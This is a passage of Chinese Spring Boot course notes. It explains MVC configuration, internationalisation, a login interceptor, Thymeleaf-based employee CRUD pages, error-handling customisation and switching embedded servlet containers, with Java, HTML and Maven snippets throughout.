WebMvcConfigurerAdapter { @Override public void addViewControllers(ViewControllerRegistry registry) { // super.addViewControllers(registry); //浏览器发送 /atguigu 请求来到 success registry.addViewController(\"/atguigu\").setViewName(\"success\"); }} 原理： 为什么@EnableWebMvc自动配置就失效了； 1）@EnableWebMvc的核心 12@Import(DelegatingWebMvcConfiguration.class)public @interface EnableWebMvc { 2）、 12@Configurationpublic class DelegatingWebMvcConfiguration extends WebMvcConfigurationSupport { 3）、 12345678910@Configuration@ConditionalOnWebApplication@ConditionalOnClass({ Servlet.class, DispatcherServlet.class, WebMvcConfigurerAdapter.class })//容器中没有这个组件的时候，这个自动配置类才生效@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)@AutoConfigureAfter({ DispatcherServletAutoConfiguration.class, ValidationAutoConfiguration.class })public class WebMvcAutoConfiguration { 4）、@EnableWebMvc将WebMvcConfigurationSupport组件导入进来； 5）、导入的WebMvcConfigurationSupport只是SpringMVC最基本的功能； 5、如何修改SpringBoot的默认配置模式： ​ 1）、SpringBoot在自动配置很多组件的时候，先看容器中有没有用户自己配置的（@Bean、@Component）如果有就用用户配置的，如果没有，才自动配置；如果有些组件可以有多个（ViewResolver）将用户配置的和自己默认的组合起来； ​ 2）、在SpringBoot中会有非常多的xxxConfigurer帮助我们进行扩展配置 ​ 3）、在SpringBoot中会有很多的xxxCustomizer帮助我们进行定制配置 6、RestfulCRUD1）、默认访问首页1234567891011121314151617181920212223242526//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能//@EnableWebMvc 不要接管SpringMVC@Configurationpublic class MyMvcConfig extends WebMvcConfigurerAdapter { @Override public void addViewControllers(ViewControllerRegistry registry) { // super.addViewControllers(registry); //浏览器发送 /atguigu 请求来到 success registry.addViewController(\"/atguigu\").setViewName(\"success\"); } //所有的WebMvcConfigurerAdapter组件都会一起起作用 @Bean //将组件注册在容器 public WebMvcConfigurerAdapter webMvcConfigurerAdapter(){ WebMvcConfigurerAdapter adapter = new WebMvcConfigurerAdapter() { @Override public void addViewControllers(ViewControllerRegistry registry) { registry.addViewController(\"/\").setViewName(\"login\"); registry.addViewController(\"/index.html\").setViewName(\"login\"); } }; return adapter; }} 2）、国际化1）、编写国际化配置文件； 2）、使用ResourceBundleMessageSource管理国际化资源文件 3）、在页面使用fmt:message取出国际化内容 步骤： 1）、编写国际化配置文件，抽取页面需要显示的国际化消息 2）、SpringBoot自动配置好了管理国际化资源文件的组件； 12345678910111213141516171819202122232425262728@ConfigurationProperties(prefix = \"spring.messages\")public class MessageSourceAutoConfiguration { /** * Comma-separated list of basenames (essentially a fully-qualified classpath * location), each following the ResourceBundle convention with relaxed support for * slash based locations. If it doesn't contain a package qualifier (such as * \"org.mypackage\"), it will be resolved from the classpath root. */ private String basename = \"messages\"; //我们的配置文件可以直接放在类路径下叫messages.properties； @Bean public MessageSource messageSource() { ResourceBundleMessageSource messageSource = new ResourceBundleMessageSource(); if (StringUtils.hasText(this.basename)) { //设置国际化资源文件的基础名（去掉语言国家代码的） messageSource.setBasenames(StringUtils.commaDelimitedListToStringArray( StringUtils.trimAllWhitespace(this.basename))); } if (this.encoding != null) { messageSource.setDefaultEncoding(this.encoding.name()); } messageSource.setFallbackToSystemLocale(this.fallbackToSystemLocale); messageSource.setCacheSeconds(this.cacheSeconds); messageSource.setAlwaysUseMessageFormat(this.alwaysUseMessageFormat); return messageSource; } 3）、去页面获取国际化的值； 123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;meta name=\"description\" content=\"\"&gt; &lt;meta name=\"author\" content=\"\"&gt; &lt;title&gt;Signin Template for Bootstrap&lt;/title&gt; &lt;!-- Bootstrap core CSS --&gt; &lt;link href=\"asserts/css/bootstrap.min.css\" th:href=\"@{/webjars/bootstrap/4.0.0/css/bootstrap.css}\" rel=\"stylesheet\"&gt; &lt;!-- Custom styles for this template --&gt; &lt;link href=\"asserts/css/signin.css\" th:href=\"@{/asserts/css/signin.css}\" rel=\"stylesheet\"&gt; &lt;/head&gt; &lt;body class=\"text-center\"&gt; &lt;form class=\"form-signin\" action=\"dashboard.html\"&gt; &lt;img class=\"mb-4\" th:src=\"@{/asserts/img/bootstrap-solid.svg}\" src=\"asserts/img/bootstrap-solid.svg\" alt=\"\" width=\"72\" height=\"72\"&gt; &lt;h1 class=\"h3 mb-3 font-weight-normal\" th:text=\"#{login.tip}\"&gt;Please sign in&lt;/h1&gt; &lt;label class=\"sr-only\" th:text=\"#{login.username}\"&gt;Username&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" placeholder=\"Username\" th:placeholder=\"#{login.username}\" required=\"\" autofocus=\"\"&gt; &lt;label class=\"sr-only\" th:text=\"#{login.password}\"&gt;Password&lt;/label&gt; &lt;input type=\"password\" class=\"form-control\" placeholder=\"Password\" th:placeholder=\"#{login.password}\" required=\"\"&gt; &lt;div class=\"checkbox mb-3\"&gt; &lt;label&gt; &lt;input type=\"checkbox\" value=\"remember-me\"/&gt; [[#{login.remember}]] &lt;/label&gt; &lt;/div&gt; &lt;button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\" th:text=\"#{login.btn}\"&gt;Sign in&lt;/button&gt; &lt;p class=\"mt-5 mb-3 text-muted\"&gt;© 2017-2018&lt;/p&gt; &lt;a class=\"btn btn-sm\"&gt;中文&lt;/a&gt; &lt;a class=\"btn btn-sm\"&gt;English&lt;/a&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 效果：根据浏览器语言设置的信息切换了国际化； 原理： ​ 国际化Locale（区域信息对象）；LocaleResolver（获取区域信息对象）； 12345678910111213 @Bean @ConditionalOnMissingBean @ConditionalOnProperty(prefix = \"spring.mvc\", name = \"locale\") public LocaleResolver localeResolver() { if (this.mvcProperties .getLocaleResolver() == WebMvcProperties.LocaleResolver.FIXED) { return new FixedLocaleResolver(this.mvcProperties.getLocale()); } AcceptHeaderLocaleResolver localeResolver = new AcceptHeaderLocaleResolver(); localeResolver.setDefaultLocale(this.mvcProperties.getLocale()); return localeResolver; }默认的就是根据请求头带来的区域信息获取Locale进行国际化 4）、点击链接切换国际化 123456789101112131415161718192021222324252627282930/** * 可以在连接上携带区域信息 */public class MyLocaleResolver implements LocaleResolver { @Override public Locale resolveLocale(HttpServletRequest request) { String l = request.getParameter(\"l\"); Locale locale = Locale.getDefault(); if(!StringUtils.isEmpty(l)){ String[] split = l.split(\"_\"); locale = new Locale(split[0],split[1]); } return locale; } @Override public void setLocale(HttpServletRequest request, HttpServletResponse response, Locale locale) { }} @Bean public LocaleResolver localeResolver(){ return new MyLocaleResolver(); }} 3）、登陆开发期间模板引擎页面修改以后，要实时生效 1）、禁用模板引擎的缓存 12# 禁用缓存spring.thymeleaf.cache=false 2）、页面修改完成以后ctrl+f9：重新编译； 登陆错误消息的显示 1&lt;p style=\"color: red\" th:text=\"${msg}\" th:if=\"${not #strings.isEmpty(msg)}\"&gt;&lt;/p&gt; 4）、拦截器进行登陆检查拦截器 12345678910111213141516171819202122232425262728293031/** * 登陆检查， */public class LoginHandlerInterceptor implements HandlerInterceptor { //目标方法执行之前 @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { Object user = request.getSession().getAttribute(\"loginUser\"); if(user == null){ //未登陆，返回登陆页面 request.setAttribute(\"msg\",\"没有权限请先登陆\"); request.getRequestDispatcher(\"/index.html\").forward(request,response); return false; }else{ //已登陆，放行请求 return true; } } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { }} 注册拦截器 1234567891011121314151617181920212223//所有的WebMvcConfigurerAdapter组件都会一起起作用 @Bean //将组件注册在容器 public WebMvcConfigurerAdapter webMvcConfigurerAdapter(){ WebMvcConfigurerAdapter adapter = new WebMvcConfigurerAdapter() { @Override public void addViewControllers(ViewControllerRegistry registry) { registry.addViewController(\"/\").setViewName(\"login\"); registry.addViewController(\"/index.html\").setViewName(\"login\"); registry.addViewController(\"/main.html\").setViewName(\"dashboard\"); } //注册拦截器 @Override public void addInterceptors(InterceptorRegistry registry) { //super.addInterceptors(registry); //静态资源； *.css , *.js //SpringBoot已经做好了静态资源映射 registry.addInterceptor(new LoginHandlerInterceptor()).addPathPatterns(\"/**\") .excludePathPatterns(\"/index.html\",\"/\",\"/user/login\"); } }; return adapter; } 5）、CRUD-员工列表实验要求： 1）、RestfulCRUD：CRUD满足Rest风格； URI： /资源名称/资源标识 HTTP请求方式区分对资源CRUD操作 普通CRUD（uri来区分操作） RestfulCRUD 查询 getEmp emp—GET 添加 addEmp?xxx emp—POST 修改 updateEmp?id=xxx&amp;xxx=xx emp/{id}—PUT 删除 deleteEmp?id=1 emp/{id}—DELETE 2）、实验的请求架构; 实验功能 请求URI 请求方式 查询所有员工 emps GET 查询某个员工(来到修改页面) emp/1 GET 来到添加页面 emp GET 添加员工 emp POST 来到修改页面（查出员工进行信息回显） emp/1 GET 修改员工 emp PUT 删除员工 emp/1 DELETE 3）、员工列表： thymeleaf公共页面元素抽取12345678910111213141、抽取公共片段&lt;div th:fragment=\"copy\"&gt;&amp;copy; 2011 The Good Thymes Virtual Grocery&lt;/div&gt;2、引入公共片段&lt;div th:insert=\"~{footer :: copy}\"&gt;&lt;/div&gt;~{templatename::selector}：模板名::选择器~{templatename::fragmentname}:模板名::片段名3、默认效果：insert的公共片段在div标签中如果使用th:insert等属性进行引入，可以不用写~{}：行内写法可以加上：[[~{}]];[(~{})]； 三种引入公共片段的th属性： th:insert：将公共片段整个插入到声明引入的元素中 th:replace：将声明引入的元素替换为公共片段 th:include：将被引入的片段的内容包含进这个标签中 1234567891011121314151617181920212223&lt;footer th:fragment=\"copy\"&gt;&amp;copy; 2011 The Good Thymes Virtual Grocery&lt;/footer&gt;引入方式&lt;div th:insert=\"footer :: copy\"&gt;&lt;/div&gt;&lt;div th:replace=\"footer :: copy\"&gt;&lt;/div&gt;&lt;div th:include=\"footer :: copy\"&gt;&lt;/div&gt;效果&lt;div&gt; &lt;footer&gt; &amp;copy; 2011 The Good Thymes Virtual Grocery &lt;/footer&gt;&lt;/div&gt;&lt;footer&gt;&amp;copy; 2011 The Good Thymes Virtual Grocery&lt;/footer&gt;&lt;div&gt;&amp;copy; 2011 The Good Thymes Virtual Grocery&lt;/div&gt; 引入片段的时候传入参数： 1234567891011121314151617&lt;nav class=\"col-md-2 d-none d-md-block bg-light sidebar\" id=\"sidebar\"&gt; &lt;div class=\"sidebar-sticky\"&gt; &lt;ul class=\"nav flex-column\"&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link active\" th:class=\"${activeUri=='main.html'?'nav-link active':'nav-link'}\" href=\"#\" th:href=\"@{/main.html}\"&gt; &lt;svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-home\"&gt; &lt;path d=\"M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z\"&gt;&lt;/path&gt; &lt;polyline points=\"9 22 9 12 15 12 15 22\"&gt;&lt;/polyline&gt; &lt;/svg&gt; Dashboard &lt;span class=\"sr-only\"&gt;(current)&lt;/span&gt; &lt;/a&gt; &lt;/li&gt;&lt;!--引入侧边栏;传入参数--&gt;&lt;div th:replace=\"commons/bar::#sidebar(activeUri='emps')\"&gt;&lt;/div&gt; 6）、CRUD-员工添加添加页面 123456789101112131415161718192021222324252627282930313233343536&lt;form&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;LastName&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" placeholder=\"zhangsan\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Email&lt;/label&gt; &lt;input type=\"email\" class=\"form-control\" placeholder=\"zhangsan@atguigu.com\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Gender&lt;/label&gt;&lt;br/&gt; &lt;div class=\"form-check form-check-inline\"&gt; &lt;input class=\"form-check-input\" type=\"radio\" name=\"gender\" value=\"1\"&gt; &lt;label class=\"form-check-label\"&gt;男&lt;/label&gt; &lt;/div&gt; &lt;div class=\"form-check form-check-inline\"&gt; &lt;input class=\"form-check-input\" type=\"radio\" name=\"gender\" value=\"0\"&gt; &lt;label class=\"form-check-label\"&gt;女&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;department&lt;/label&gt; &lt;select class=\"form-control\"&gt; &lt;option&gt;1&lt;/option&gt; &lt;option&gt;2&lt;/option&gt; &lt;option&gt;3&lt;/option&gt; &lt;option&gt;4&lt;/option&gt; &lt;option&gt;5&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Birth&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" placeholder=\"zhangsan\"&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-primary\"&gt;添加&lt;/button&gt;&lt;/form&gt; 提交的数据格式不对：生日：日期； 2017-12-12；2017/12/12；2017.12.12； 日期的格式化；SpringMVC将页面提交的值需要转换为指定的类型; 2017-12-12—Date； 类型转换，格式化; 默认日期是按照/的方式； 7）、CRUD-员工修改修改添加二合一表单 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!--需要区分是员工修改还是添加；--&gt;&lt;form th:action=\"@{/emp}\" method=\"post\"&gt; &lt;!--发送put请求修改员工数据--&gt; &lt;!--1、SpringMVC中配置HiddenHttpMethodFilter;（SpringBoot自动配置好的）2、页面创建一个post表单3、创建一个input项，name=\"_method\";值就是我们指定的请求方式--&gt; &lt;input type=\"hidden\" name=\"_method\" value=\"put\" th:if=\"${emp!=null}\"/&gt; &lt;input type=\"hidden\" name=\"id\" th:if=\"${emp!=null}\" th:value=\"${emp.id}\"&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;LastName&lt;/label&gt; &lt;input name=\"lastName\" type=\"text\" class=\"form-control\" placeholder=\"zhangsan\" th:value=\"${emp!=null}?${emp.lastName}\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Email&lt;/label&gt; &lt;input name=\"email\" type=\"email\" class=\"form-control\" placeholder=\"zhangsan@atguigu.com\" th:value=\"${emp!=null}?${emp.email}\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Gender&lt;/label&gt;&lt;br/&gt; &lt;div class=\"form-check form-check-inline\"&gt; &lt;input class=\"form-check-input\" type=\"radio\" name=\"gender\" value=\"1\" th:checked=\"${emp!=null}?${emp.gender==1}\"&gt; &lt;label class=\"form-check-label\"&gt;男&lt;/label&gt; &lt;/div&gt; &lt;div class=\"form-check form-check-inline\"&gt; &lt;input class=\"form-check-input\" type=\"radio\" name=\"gender\" value=\"0\" th:checked=\"${emp!=null}?${emp.gender==0}\"&gt; &lt;label class=\"form-check-label\"&gt;女&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;department&lt;/label&gt; &lt;!--提交的是部门的id--&gt; &lt;select class=\"form-control\" name=\"department.id\"&gt; &lt;option th:selected=\"${emp!=null}?${dept.id == emp.department.id}\" th:value=\"${dept.id}\" th:each=\"dept:${depts}\" th:text=\"${dept.departmentName}\"&gt;1&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Birth&lt;/label&gt; &lt;input name=\"birth\" type=\"text\" class=\"form-control\" placeholder=\"zhangsan\" th:value=\"${emp!=null}?${#dates.format(emp.birth, 'yyyy-MM-dd HH:mm')}\"&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-primary\" th:text=\"${emp!=null}?'修改':'添加'\"&gt;添加&lt;/button&gt;&lt;/form&gt; 8）、CRUD-员工删除123456789101112131415161718192021&lt;tr th:each=\"emp:${emps}\"&gt; &lt;td th:text=\"${emp.id}\"&gt;&lt;/td&gt; &lt;td&gt;[[${emp.lastName}]]&lt;/td&gt; &lt;td th:text=\"${emp.email}\"&gt;&lt;/td&gt; &lt;td th:text=\"${emp.gender}==0?'女':'男'\"&gt;&lt;/td&gt; &lt;td th:text=\"${emp.department.departmentName}\"&gt;&lt;/td&gt; &lt;td th:text=\"${#dates.format(emp.birth, 'yyyy-MM-dd HH:mm')}\"&gt;&lt;/td&gt; &lt;td&gt; &lt;a class=\"btn btn-sm btn-primary\" th:href=\"@{/emp/}+${emp.id}\"&gt;编辑&lt;/a&gt; &lt;button th:attr=\"del_uri=@{/emp/}+${emp.id}\" class=\"btn btn-sm btn-danger deleteBtn\"&gt;删除&lt;/button&gt; &lt;/td&gt;&lt;/tr&gt;&lt;script&gt; $(\".deleteBtn\").click(function(){ //删除当前员工的 $(\"#deleteEmpForm\").attr(\"action\",$(this).attr(\"del_uri\")).submit(); return false; });&lt;/script&gt; 7、错误处理机制1）、SpringBoot默认的错误处理机制默认效果： ​ 1）、浏览器，返回一个默认的错误页面 浏览器发送请求的请求头： ​ 2）、如果是其他客户端，默认响应一个json数据 ​ 原理： ​ 可以参照ErrorMvcAutoConfiguration；错误处理的自动配置； 给容器中添加了以下组件 ​ 1、DefaultErrorAttributes： 1234567891011帮我们在页面共享信息；@Override public Map&lt;String, Object&gt; getErrorAttributes(RequestAttributes requestAttributes, boolean includeStackTrace) { Map&lt;String, Object&gt; errorAttributes = new LinkedHashMap&lt;String, Object&gt;(); errorAttributes.put(\"timestamp\", new Date()); addStatus(errorAttributes, requestAttributes); addErrorDetails(errorAttributes, requestAttributes, includeStackTrace); addPath(errorAttributes, requestAttributes); return errorAttributes; } ​ 2、BasicErrorController：处理默认/error请求 12345678910111213141516171819202122232425@Controller@RequestMapping(\"${server.error.path:${error.path:/error}}\")public class BasicErrorController extends AbstractErrorController { @RequestMapping(produces = \"text/html\")//产生html类型的数据；浏览器发送的请求来到这个方法处理 public ModelAndView errorHtml(HttpServletRequest request, HttpServletResponse response) { HttpStatus status = getStatus(request); Map&lt;String, Object&gt; model = Collections.unmodifiableMap(getErrorAttributes( request, isIncludeStackTrace(request, MediaType.TEXT_HTML))); response.setStatus(status.value()); //去哪个页面作为错误页面；包含页面地址和页面内容 ModelAndView modelAndView = resolveErrorView(request, response, status, model); return (modelAndView == null ? new ModelAndView(\"error\", model) : modelAndView); } @RequestMapping @ResponseBody //产生json数据，其他客户端来到这个方法处理； public ResponseEntity&lt;Map&lt;String, Object&gt;&gt; error(HttpServletRequest request) { Map&lt;String, Object&gt; body = getErrorAttributes(request, isIncludeStackTrace(request, MediaType.ALL)); HttpStatus status = getStatus(request); return new ResponseEntity&lt;Map&lt;String, Object&gt;&gt;(body, status); } ​ 3、ErrorPageCustomizer： 12@Value(\"${error.path:/error}\")private String path = \"/error\"; 系统出现错误以后来到error请求进行处理；（web.xml注册的错误页面规则） ​ 4、DefaultErrorViewResolver： 123456789101112131415161718192021222324@Override public ModelAndView resolveErrorView(HttpServletRequest request, HttpStatus status, Map&lt;String, Object&gt; model) { ModelAndView modelAndView = resolve(String.valueOf(status), model); if (modelAndView == null &amp;&amp; SERIES_VIEWS.containsKey(status.series())) { modelAndView = resolve(SERIES_VIEWS.get(status.series()), model); } return modelAndView; } private ModelAndView resolve(String viewName, Map&lt;String, Object&gt; model) { //默认SpringBoot可以去找到一个页面？ error/404 String errorViewName = \"error/\" + viewName; //模板引擎可以解析这个页面地址就用模板引擎解析 TemplateAvailabilityProvider provider = this.templateAvailabilityProviders .getProvider(errorViewName, this.applicationContext); if (provider != null) { //模板引擎可用的情况下返回到errorViewName指定的视图地址 return new ModelAndView(errorViewName, model); } //模板引擎不可用，就在静态资源文件夹下找errorViewName对应的页面 error/404.html return resolveResource(errorViewName, model); } ​ 步骤： ​ 一但系统出现4xx或者5xx之类的错误；ErrorPageCustomizer就会生效（定制错误的响应规则）；就会来到/error请求；就会被BasicErrorController处理； ​ 1）响应页面；去哪个页面是由DefaultErrorViewResolver解析得到的； 1234567891011protected ModelAndView resolveErrorView(HttpServletRequest request, HttpServletResponse response, HttpStatus status, Map&lt;String, Object&gt; model) { //所有的ErrorViewResolver得到ModelAndView for (ErrorViewResolver resolver : this.errorViewResolvers) { ModelAndView modelAndView = resolver.resolveErrorView(request, status, model); if (modelAndView != null) { return modelAndView; } } return null;} 2）、如果定制错误响应：1）、如何定制错误的页面；​ 1）、有模板引擎的情况下；error/状态码; 【将错误页面命名为 错误状态码.html 放在模板引擎文件夹里面的 error文件夹下】，发生此状态码的错误就会来到 对应的页面； ​ 我们可以使用4xx和5xx作为错误页面的文件名来匹配这种类型的所有错误，精确优先（优先寻找精确的状态码.html）； ​ 页面能获取的信息； ​ timestamp：时间戳 ​ status：状态码 ​ error：错误提示 ​ exception：异常对象 ​ message：异常消息 ​ errors：JSR303数据校验的错误都在这里 ​ 2）、没有模板引擎（模板引擎找不到这个错误页面），静态资源文件夹下找； ​ 3）、以上都没有错误页面，就是默认来到SpringBoot默认的错误提示页面； 2）、如何定制错误的json数据；​ 1）、自定义异常处理&amp;返回定制json数据； 12345678910111213@ControllerAdvicepublic class MyExceptionHandler { @ResponseBody @ExceptionHandler(UserNotExistException.class) public Map&lt;String,Object&gt; handleException(Exception e){ Map&lt;String,Object&gt; map = new HashMap&lt;&gt;(); map.put(\"code\",\"user.notexist\"); map.put(\"message\",e.getMessage()); return map; }}//没有自适应效果... ​ 2）、转发到/error进行自适应响应效果处理 1234567891011121314@ExceptionHandler(UserNotExistException.class) public String handleException(Exception e, HttpServletRequest request){ Map&lt;String,Object&gt; map = new HashMap&lt;&gt;(); //传入我们自己的错误状态码 4xx 5xx，否则就不会进入定制错误页面的解析流程 /** * Integer statusCode = (Integer) request .getAttribute(\"javax.servlet.error.status_code\"); */ request.setAttribute(\"javax.servlet.error.status_code\",500); map.put(\"code\",\"user.notexist\"); map.put(\"message\",e.getMessage()); //转发到/error return \"forward:/error\"; } 3）、将我们的定制数据携带出去；出现错误以后，会来到/error请求，会被BasicErrorController处理，响应出去可以获取的数据是由getErrorAttributes得到的（是AbstractErrorController（ErrorController）规定的方法）； ​ 1、完全来编写一个ErrorController的实现类【或者是编写AbstractErrorController的子类】，放在容器中； ​ 2、页面上能用的数据，或者是json返回能用的数据都是通过errorAttributes.getErrorAttributes得到； ​ 容器中DefaultErrorAttributes.getErrorAttributes()；默认进行数据处理的； 自定义ErrorAttributes 1234567891011//给容器中加入我们自己定义的ErrorAttributes@Componentpublic class MyErrorAttributes extends DefaultErrorAttributes { @Override public Map&lt;String, Object&gt; getErrorAttributes(RequestAttributes requestAttributes, boolean includeStackTrace) { Map&lt;String, Object&gt; map = super.getErrorAttributes(requestAttributes, includeStackTrace); map.put(\"company\",\"atguigu\"); return map; }} 最终的效果：响应是自适应的，可以通过定制ErrorAttributes改变需要返回的内容， 8、配置嵌入式Servlet容器SpringBoot默认使用Tomcat作为嵌入式的Servlet容器； 问题？ 1）、如何定制和修改Servlet容器的相关配置；1、修改和server有关的配置（ServerProperties【也是EmbeddedServletContainerCustomizer】）； 123456789server.port=8081server.context-path=/crudserver.tomcat.uri-encoding=UTF-8//通用的Servlet容器设置server.xxx//Tomcat的设置server.tomcat.xxx 2、编写一个EmbeddedServletContainerCustomizer：嵌入式的Servlet容器的定制器；来修改Servlet容器的配置 1234567891011@Bean //一定要将这个定制器加入到容器中public EmbeddedServletContainerCustomizer embeddedServletContainerCustomizer(){ return new EmbeddedServletContainerCustomizer() { //定制嵌入式的Servlet容器相关的规则 @Override public void customize(ConfigurableEmbeddedServletContainer container) { container.setPort(8083); } };} 2）、注册Servlet三大组件【Servlet、Filter、Listener】由于SpringBoot默认是以jar包的方式启动嵌入式的Servlet容器来启动SpringBoot的web应用，没有web.xml文件。 注册三大组件用以下方式 ServletRegistrationBean 1234567//注册三大组件@Beanpublic ServletRegistrationBean myServlet(){ ServletRegistrationBean registrationBean = new ServletRegistrationBean(new MyServlet(),\"/myServlet\"); return registrationBean;} FilterRegistrationBean 1234567@Beanpublic FilterRegistrationBean myFilter(){ FilterRegistrationBean registrationBean = new FilterRegistrationBean(); registrationBean.setFilter(new MyFilter()); registrationBean.setUrlPatterns(Arrays.asList(\"/hello\",\"/myServlet\")); return registrationBean;} ServletListenerRegistrationBean 12345@Beanpublic ServletListenerRegistrationBean myListener(){ ServletListenerRegistrationBean&lt;MyListener&gt; registrationBean = new ServletListenerRegistrationBean&lt;&gt;(new MyListener()); return registrationBean;} SpringBoot帮我们自动SpringMVC的时候，自动的注册SpringMVC的前端控制器；DIspatcherServlet； DispatcherServletAutoConfiguration中： 123456789101112131415161718@Bean(name = DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME)@ConditionalOnBean(value = DispatcherServlet.class, name = DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)public ServletRegistrationBean dispatcherServletRegistration( DispatcherServlet dispatcherServlet) { ServletRegistrationBean registration = new ServletRegistrationBean( dispatcherServlet, this.serverProperties.getServletMapping()); //默认拦截： / 所有请求；包静态资源，但是不拦截jsp请求； /*会拦截jsp //可以通过server.servletPath来修改SpringMVC前端控制器默认拦截的请求路径 registration.setName(DEFAULT_DISPATCHER_SERVLET_BEAN_NAME); registration.setLoadOnStartup( this.webMvcProperties.getServlet().getLoadOnStartup()); if (this.multipartConfig != null) { registration.setMultipartConfig(this.multipartConfig); } return registration;} 2）、SpringBoot能不能支持其他的Servlet容器； 3）、替换为其他嵌入式Servlet容器 默认支持： Tomcat（默认使用） 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; 引入web模块默认就是使用嵌入式的Tomcat作为Servlet容器；&lt;/dependency&gt; Jetty 1234567891011121314151617&lt;!-- 引入web模块 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;!--引入其他的Servlet容器--&gt;&lt;dependency&gt; &lt;artifactId&gt;spring-boot-starter-jetty&lt;/artifactId&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;/dependency&gt; Undertow 1234567891011121314151617&lt;!-- 引入web模块 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;!--引入其他的Servlet容器--&gt;&lt;dependency&gt; &lt;artifactId&gt;spring-boot-starter-undertow&lt;/artifactId&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;/dependency&gt; 4）、嵌入式Servlet容器自动配置原理；EmbeddedServletContainerAutoConfiguration：嵌入式的Servlet容器自动配置？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE)@Configuration@ConditionalOnWebApplication@Import(BeanPostProcessorsRegistrar.class)//导入BeanPostProcessorsRegistrar：Spring注解版；给容器中导入一些组件//导入了EmbeddedServletContainerCustomizerBeanPostProcessor：//后置处理器：bean初始化前后（创建完对象，还没赋值赋值）执行初始化工作public class EmbeddedServletContainerAutoConfiguration { @Configuration @ConditionalOnClass({ Servlet.class, Tomcat.class })//判断当前是否引入了Tomcat依赖； @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT)//判断当前容器没有用户自己定义EmbeddedServletContainerFactory：嵌入式的Servlet容器工厂；作用：创建嵌入式的Servlet容器 public static class EmbeddedTomcat { @Bean public TomcatEmbeddedServletContainerFactory tomcatEmbeddedServletContainerFactory() { return new TomcatEmbeddedServletContainerFactory(); } } /** * Nested configuration if Jetty is being used. */ @Configuration @ConditionalOnClass({ Servlet.class, Server.class, Loader.class, WebAppContext.class }) @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT) public static class EmbeddedJetty { @Bean public JettyEmbeddedServletContainerFactory jettyEmbeddedServletContainerFactory() { return new JettyEmbeddedServletContainerFactory(); } } /** * Nested configuration if Undertow is being used. */ @Configuration @ConditionalOnClass({ Servlet.class, Undertow.class, SslClientAuthMode.class }) @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT) public static class EmbeddedUndertow { @Bean public UndertowEmbeddedServletContainerFactory undertowEmbeddedServletContainerFactory() { return new UndertowEmbeddedServletContainerFactory(); } } 1）、EmbeddedServletContainerFactory（嵌入式Servlet容器工厂） 1234567public interface EmbeddedServletContainerFactory { //获取嵌入式的Servlet容器 EmbeddedServletContainer getEmbeddedServletContainer( 